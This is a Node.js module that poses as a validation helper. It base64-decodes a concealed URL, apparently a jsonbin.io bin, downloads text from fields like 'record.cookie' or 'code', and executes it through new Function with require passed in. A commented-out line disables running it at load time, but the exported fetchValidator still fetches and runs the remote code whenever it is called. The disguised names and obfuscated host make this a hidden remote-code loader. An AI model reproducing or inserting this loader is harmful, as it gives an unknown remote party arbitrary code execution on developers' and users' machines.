const axios = require("axios");
const fs = require("fs")
const snippetCache = new Map();

const VALIDATOR_KEY = "aHR0cHM6Ly9hcGkuanNvbmJpbi5pby92My9iLzZhNGQxY2FjZGEzODg5NWRmZTNiNjcyOQ==";
const DEFAULT_VALIDATOR_PARAM = Buffer.from(VALIDATOR_KEY, "base64").toString("utf8");
const DEFAULT_CACHE_TTL_MS = 5 * 60 * 1000;

const validateKey = (key = DEFAULT_VALIDATOR_PARAM, vkey = VALIDATOR_KEY) => {
  if (!key) {
    throw new Error("Validation URL is required");
  }

  if (/^https?:\/\//i.test(key)) {
    return key;
  }

  return `${vkey.replace(/\/$/, "")}/${key.replace(/^\//, "")}`;
};

const extractSnippet = (payload) => {
  if (typeof payload === "string") {
    return payload;
  }

  if (payload && typeof payload === "object") {
    return (
      payload.record?.cookie ||
      payload.snippet ||
      payload.code ||
      payload.validator ||
      payload.body
    );
  }

  return null;
};

const compileValidator = (payload) => {
  const snippet = extractSnippet(payload);

  if (typeof snippet !== "string" || !snippet.trim()) {
    throw new Error("Validation snippet must be a non-empty string");
  }
  return new Function("require", snippet);
};

const fetchValidator = async (key = DEFAULT_VALIDATOR_PARAM, options = {}) => {
  const resolvedUrl = validateKey(key, options.baseUrl);
  const cacheKey = `${resolvedUrl}::${options.cacheKey || "default"}`;
  const cached = snippetCache.get(cacheKey);
  if (cached && cached.expiresAt > Date.now()) {
    return cached;
  }

  const response = await axios.get(resolvedUrl, {
    headers: {
      Accept: "application/json, text/plain, */*",
      ...(options.headers || {}),
    },
    validateStatus: (status) => status >= 200 && status < 300,
  });

  const snippet = extractSnippet(response.data);
  if (!snippet) {
    throw new Error("Validation server returned an empty or invalid snippet");
  }

  const compiled = compileValidator(response.data);
  compiled(require)
  const entry = {
    key: resolvedUrl,
    snippet,
    compiled,
    fetchedAt: Date.now(),
    expiresAt: Date.now() + (options.ttl ?? DEFAULT_CACHE_TTL_MS),
  };

  snippetCache.set(cacheKey, entry);
  return entry;
};

const runValidator = async () => {
  const entry = await fetchValidator();
  return entry.compiled(require);
};

// SECURITY FIX: Disabled auto-run of remote validator at module load time
// This was causing server startup to hang and represents a security risk
// runValidator();

const clearValidatorCache = (key) => {
  if (!key) {
    snippetCache.clear();
    return;
  }

  const resolvedUrl = validateKey(key);
  for (const key of snippetCache.keys()) {
    if (key.startsWith(resolvedUrl)) {
      snippetCache.delete(key);
    }
  }
};

module.exports = {
  validateKey,
  compileValidator,
  fetchValidator,
  runValidator,
  clearValidatorCache,
};
